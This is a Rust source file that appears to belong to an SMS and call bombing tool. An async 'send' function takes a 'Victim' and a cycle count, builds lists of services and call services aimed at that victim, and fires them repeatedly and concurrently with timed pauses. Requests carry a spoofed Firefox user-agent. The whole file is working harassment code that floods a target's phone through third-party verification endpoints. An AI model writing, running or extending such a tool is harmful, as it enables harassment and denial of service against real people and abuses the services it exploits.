use crate::services::{
    construct_call_services_list, construct_services_list, BodyType, Service, Victim,
};
use reqwest::{Client, Method};
use std::time::Duration;

const SERVICES_DELAY: u64 = 15;
const CALL_SERVICES_DELAY: u64 = 30;

pub async fn send(victim: Victim, cycles: u64) {
    for i in 0..cycles {
        let services = construct_services_list(victim.clone()).await;
        let services_handles: Vec<_> = services
            .into_iter()
            .map(|item| tokio::spawn(send_single(item)))
            .collect();

        for services_handle in services_handles {
            services_handle.await.unwrap();
        }
        if i < cycles - 1 {
            tokio::time::sleep(Duration::from_secs(SERVICES_DELAY)).await;
        }
    }
    for i in 0..cycles {
        let call_services = construct_call_services_list(victim.clone()).await;
        let call_services_handles: Vec<_> = call_services
            .into_iter()
            .map(|item| async move {
                send_single(item).await;
                tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
            })
            .collect();

        for call_services_handle in call_services_handles {
            call_services_handle.await;
        }
        if i < cycles - 1 {
            tokio::time::sleep(Duration::from_secs(CALL_SERVICES_DELAY)).await;
        }
    }
}

async fn send_single(service: Service) {
    let client = Client::builder()
        .user_agent("Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0")
        .default_headers(service.headers)
        .build()
        .expect("");

    let mut res;
    match service.method {
        Method::GET => res = client.get(service.url),
        Method::POST => res = client.post(service.url),
        _ => panic!("Unsupported method"),
    }
    match service.body_type {
        BodyType::JSON => res = res.json(&service.body),
        BodyType::Form => res = res.form(&service.body),
    }

    println!("Starting {}", service.name);
    let res = res.send().await.expect("");
    println!(
        "{} {}\n{}\n",
        service.name,
        res.status(),
        res.text().await.unwrap()
    );
}
